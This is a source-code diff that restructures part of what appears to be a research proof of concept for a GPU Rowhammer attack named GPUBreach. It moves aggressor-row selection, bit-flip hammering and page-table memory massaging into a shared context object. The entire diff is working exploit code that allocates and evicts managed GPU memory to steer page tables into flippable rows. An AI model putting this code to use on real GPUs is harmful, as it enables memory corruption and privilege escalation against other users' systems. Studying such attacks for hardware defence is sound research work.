@@ -21,8 +21,8 @@ first_PT_region_test (int argc, char *argv[])
   const double threshold = std::stod (argv[1]);
   const uint64_t skip = std::stoull (argv[2]);
 
-  std::vector<uint8_t *> alloc_ptrs;
-  if (!alloc_all_mem (num_alloc_init, threshold, skip, &alloc_ptrs))
+  GPUBreachContext ctx;
+  if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
     {
       printf ("Error: Memory Allocation is wrong\n");
       exit (1);
@@ -78,12 +78,13 @@ first_PT_region_test (int argc, char *argv[])
 }
 
 static uint64_t
-hardcoded_rowhammer_bitflip_page (std::vector<uint8_t *> &alloc_ptrs,
-                                  std::vector<uint8_t *> *agg_ptrs,
-                                  RowList *agg_row_list,
-                                  std::vector<uint64_t> *agg_vec)
+hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
 {
   uint8_t *temp;
+  auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
+  auto& agg_ptrs = ctx.step2_data.agg_ptrs;
+  auto& agg_row_list = ctx.step2_data.agg_row_list;
+  auto& agg_vec = ctx.step2_data.agg_vec;
   uint8_t *layout = (uint8_t *)alloc_ptrs[0];
 
   const uint64_t num_victim = 23;
@@ -130,51 +131,42 @@ hardcoded_rowhammer_bitflip_page (std::vector<uint8_t *> &alloc_ptrs,
    * reused. We use this to conserve the memory for Rowhammer from the
    * massaging memory.
    */
-  std::vector<uint8_t *> hammer_pointers;
   for (uint64_t i = 0; i < to_reserve; i++)
     {
       evict_from_device (alloc_ptrs[first_hammer_page + i], ALLOC_SIZE);
       cudaMallocManaged (&temp, ALLOC_SIZE);
       time_data_access (temp, ALLOC_SIZE);
-      hammer_pointers.push_back (temp);
+      agg_ptrs.push_back (temp);
       DBG_OUT << first_hammer_page + i << '\n';
     }
 
   auto offset_map = get_relative_aggressor_offset (rows, target_agg, layout);
   auto row_agg_pair
-      = get_aggressor_rows_from_offset (hammer_pointers, offset_map);
+      = get_aggressor_rows_from_offset (agg_ptrs, offset_map);
   set_rows (row_agg_pair.first, row_agg_pair.second, agg_pat, step);
   cudaDeviceSynchronize ();
 
-  if (agg_row_list)
-    *agg_row_list = row_agg_pair.first;
-  if (agg_vec)
-    *agg_vec = row_agg_pair.second;
-  if (agg_ptrs)
-    *agg_ptrs = hammer_pointers;
+  agg_row_list = row_agg_pair.first;
+  agg_vec = row_agg_pair.second;
 
   return last_hammer_page;
 }
 
 bool
-first_PT_region (int argc, char *argv[], std::vector<uint8_t *> *agg_ptrs,
-                 RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
+first_PT_region (int argc, char *argv[])
 {
   const uint64_t num_alloc_init = std::stoll (argv[0]);
   const double threshold = std::stod (argv[1]);
   const uint64_t skip = std::stoull (argv[2]);
+  GPUBreachContext ctx;
 
-  return first_PT_region (num_alloc_init, threshold, skip, agg_ptrs,
-                          agg_row_list, agg_vec);
+  return first_PT_region (num_alloc_init, threshold, skip, ctx);
 }
 
 bool
-first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip,
-                 std::vector<uint8_t *> *agg_ptrs, RowList *agg_row_list,
-                 std::vector<uint64_t> *agg_vec)
+first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBreachContext &ctx)
 {
-  std::vector<uint8_t *> alloc_ptrs;
-  if (!alloc_all_mem (num_alloc_init, threshold, skip, &alloc_ptrs))
+  if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
     {
       std::cout << "Error: Memory Allocation is wrong" << "\n";
       exit (1);
@@ -190,8 +182,8 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip,
    * page you'd like that fits in your VRAM, but 1000-3000 should be
    * feasible on most GPUs (8GB+).
    */
-  auto last_hammer_page = hardcoded_rowhammer_bitflip_page (
-      alloc_ptrs, agg_ptrs, agg_row_list, agg_vec);
+  auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
+  auto last_hammer_page = hardcoded_rowhammer_bitflip_page (ctx);
 
   /****************************************************************/
   /* Step 2 of Paper: Massaging first PT Region to Flippy Memory */
@@ -200,6 +192,7 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip,
   std::vector<uint8_t *> misc_ptrs;
   uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
   uint64_t next_id = ERR_next_id;
+  
   for (uint64_t i = 0; i < num_alloc_init; i += 1)
     {
       // Create free space for Page Table Region
